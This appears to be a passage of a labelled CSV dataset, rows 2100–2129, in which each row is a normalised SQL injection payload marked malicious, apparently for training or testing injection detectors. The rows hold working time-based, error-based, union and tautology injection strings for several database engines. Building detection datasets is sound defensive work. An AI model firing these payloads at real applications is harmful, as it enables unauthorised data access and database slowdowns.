row_index,payload_norm,label,sqli_type_hint
2100,"1%"" and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ""%"" = """,1,
2101,1'|| ( select 'vuku' where 3143 = 3143 waitfor delay '0:0:5'--,1,
2102,"-8026 or elt ( 8434 = 4516,4516 ) # bsqo",1,
2103,"1' ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( 'wmrr' like 'wmrr",1,
2104,"1"" ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,
2105,select pg_sleep ( 5 ) # pjvi,1,
2106,"1' union all select null,null#",1,
2107,"1' ) as siyk where 1514 = 1514 union all select null,null,null,null,null,null#",1,
2108,"1' in boolean mode ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) #",1,
2109,"1%' ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( '%' = '",1,
2110,"1'+ ( select sfmz where 4870 = 4870 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
2111,"-9183"" ) as wctu where 2058 = 2058 or 3038 = 3038",1,
2112,"1"" where 9135 = 9135 and elt ( 4249 = 4249,7259 ) --",1,
2113,"1 ) where 5012 = 5012 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --",1,
2114,"-2377%' ) ) ) union all select 7706,7706--",1,
2115,"1"" ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,
2116,"1"" ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ""lazm"" like ""lazm",1,
2117,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 'pwuy' = 'pwuy",1,
2118,1%' and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and '%' = ',1,
2119,1' ) as mpsf where 3348 = 3348,1,
2120,"-9352"" ) ) ) or 3038 = 3038",1,
2121,"1%' ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( '%' = '",1,
2122,-8131' ) ) or 9680 = 3467,1,
2123,"1 ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )",1,
2124,"-3729' ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 'czed' = 'czed",1,
2125,"1',row ( 7937,5067 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 7937 = 7937,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 9974 union select 5497 union select 8209 union select 8147 ) a group by x )",1,
2126,-2761 or 1144 = 7657-- mfml,1,
2127,-5152' ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 'jumr' like 'jumr,1,
2128,"1 ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( 5037 = 5037",1,
2129,"-8971'|| ( select 'smyx' where 7970 = 7970 union all select 7970,7970,7970,7970,7970,7970,7970#",1,
